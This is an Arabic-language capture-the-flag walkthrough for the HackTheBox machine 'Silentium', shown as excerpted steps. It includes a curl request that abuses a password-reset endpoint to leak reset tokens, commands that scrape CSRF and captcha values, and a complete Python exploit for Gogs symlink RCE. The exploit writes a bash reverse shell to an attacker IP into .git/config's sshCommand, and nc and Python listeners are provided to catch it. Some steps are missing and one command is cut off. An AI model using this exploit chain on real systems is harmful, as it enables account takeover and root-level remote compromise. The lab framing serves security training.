04 — اختراق الحساب عبر Password Reset Step 4

ثغرة CVE-2025-59528 — الـ endpoint /api/v1/account/forgot-password عند إرساله مع header خاص x-request-from: internal، يعيد كامل بيانات المستخدم بما فيها tempToken لإعادة تعيين كلمة السر!

الخطوة 1 — طلب token إعادة التعيين

curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user": {"email": "ben@silentium.htb"}}'

الرد من السيرفر

05 — RCE داخل Docker عبر CustomMCP Step 5

🔴 Flowise يعمل على Node.js مع صلاحيات كاملة — يمكن استخدام child_process لتنفيذ أي أمر

09 — تسجيل حساب على Gogs والحصول على API Token Step 9

الخطوة 1 — الحصول على CSRF Token و Captcha

# على الجهاز المستهدف (ben@silentium):
curl -s http://127.0.0.1:3001/user/sign_up -c /tmp/cookies.txt > /tmp/signup.html

# استخراج CSRF
CSRF=$(grep -oP 'name="_csrf" value="\K[^"]+' /tmp/signup.html | head -1)

# استخراج Captcha ID
CAPTCHA_ID=$(grep -oP 'name="captcha_id" value="\K[^"]+' /tmp/signup.html | head -1)

# تحميل صورة الـ Captcha

  "http://127.0.0.1:3001/captcha/${CAPTCHA_ID}.png" -o /tmp/captcha.png

10 — CVE-2025-8110 — Gogs Symlink RCE Step 10

شرح الثغرة

Gogs لا يتحقق من الـ Symlinks عند تحديث محتوى ملف عبر الـ API. هذا يسمح بالكتابة فوق ملف .git/config بمحتوى خبيث. الـ core.sshCommand في هذا الملف يُنفَّذ تلقائياً عند أي عملية git عبر SSH.

1

إنشاء Repo + Symlink يشير إلى .git/config

نرفع ملف symlink داخل الـ Repository يشير للملف الحساس

2

تحديث محتوى الـ Symlink عبر API

Gogs يكتب المحتوى في .git/config الحقيقي بدل الـ Symlink

3

Gogs يُشغّل git push عبر SSH

فيُنفِّذ sshCommand الخبيث — reverse shell كـ root!

الخطوة 1 — فتح Listener (على جهازك)

# على Linux/Kali:
nc -lvnp 9001

# على Windows (Python):
python3 -c "
import socket; s=socket.socket()
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',9001)); s.listen(1)
print('[+] Waiting for connection on port 9001...')
conn,addr=s.accept()
print(f'[+] Connection from {addr}')
[print(conn.recv(4096).decode(),end='') or conn.send((input()+'\n').encode()) for _ in iter(int,1)]
"

الخطوة 2 — السكريبت الخاص بنا (exploit2.py)

احفظ هذا الملف في /home/ben/exploit2.py على الجهاز المستهدف:

#!/usr/bin/env python3
# CVE-2025-8110 — Gogs Symlink Git Config Injection RCE
# HackTheBox: Silentium

import requests
import subprocess
import tempfile
import os
import base64

# ============ إعدادات مخصصة ============
GOGS_URL = "http://127.0.0.1:3001"
HOST     = "staging-v2-code.dev.silentium.htb"  # Host header مطلوب
REPO     = "pwn-repo2"                           # اسم الـ Repository
USERNAME = "yyty"                                # الحساب المسجّل على Gogs
PASSWORD = "Max%40123max"                        # @ مشفّرة كـ %40 في الـ URL
TOKEN    = "0ca8513ad024ffe37b6f2ad601ffaa63b269d41f"  # API Token
LHOST    = "10.10.16.195"                        # IP جهاز المهاجم
LPORT    = "9001"                                # بورت الاستماع
# =======================================

# إنشاء Session مع Headers المطلوبة
s = requests.Session()
s.headers.update({"Host": HOST, "Authorization": f"token {TOKEN}"})

# 1. إنشاء Repository جديد
r = s.post(f"{GOGS_URL}/api/v1/user/repos",
           json={"name": REPO, "private": False, "auto_init": False})
print(f"[+] Repo creation status: {r.status_code}")
# 201 = جديد / 422 = موجود مسبقاً (كلاهما مقبول)

# 2. إنشاء Repository محلي مع Symlink
work = tempfile.mkdtemp()
os.chdir(work)
subprocess.run(["git", "init"], capture_output=True)
subprocess.run(["git", "config", "user.email", "h@h.com"], capture_output=True)
subprocess.run(["git", "config", "user.name", "h"], capture_output=True)

# ⭐ جوهر الثغرة: symlink يشير إلى .git/config
os.symlink(".git/config", os.path.join(work, "symlink"))
open(os.path.join(work, "README.md"), "w").write("x\n")
subprocess.run(["git", "add", "-A"], capture_output=True)
subprocess.run(["git", "commit", "-m", "init"], capture_output=True)

# 3. رفع الـ Repo إلى Gogs (كلمة السر تحتوي @ مشفّرة)
push_url = f"http://{USERNAME}:{PASSWORD}@127.0.0.1:3001/{USERNAME}/{REPO}.git"
result = subprocess.run(
    ["git", "push", push_url, "master", "--force"],
    capture_output=True,
    env={**os.environ, "GIT_TERMINAL_PROMPT": "0"}
)
print(f"[+] Push result: {result.returncode}")
print(result.stderr.decode())

# 4. الحصول على SHA الحالي للـ Symlink (مطلوب لـ PUT)
r = s.get(f"{GOGS_URL}/api/v1/repos/{USERNAME}/{REPO}/contents/symlink")
print(f"[+] GET symlink status: {r.status_code}")
sha = r.json()["sha"]
print(f"[+] SHA: {sha}")

# 5. إنشاء .git/config خبيث مع reverse shell في sshCommand
config = (
    "[core]\n"
    "\trepositoryformatversion = 0\n"
    "\tfilemode = true\n"
    "\tbare = false\n"
    f"\tsshCommand = bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\n"
    "[remote \"origin\"]\n"
    "\turl = ssh://localhost/x\n"       # ssh:// ضروري لتفعيل sshCommand
    "\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
    "[branch \"master\"]\n"
    "\tremote = origin\n"
    "\tmerge = refs/heads/master\n"
)

# 6. الكتابة عبر الـ Symlink — Gogs سيكتب في .git/config!
r = s.put(
    f"{GOGS_URL}/api/v1/repos/{USERNAME}/{REPO}/contents/symlink",
    json={
        "content": base64.b64encode(config.encode()).decode(),
        "message": "update",
        "sha": sha
    }
)
print(f"[+] PUT status: {r.status_code}")
# 500 = طبيعي! الكتابة تمت رغم الخطأ
print("[+] Exploit sent, check your listener!")
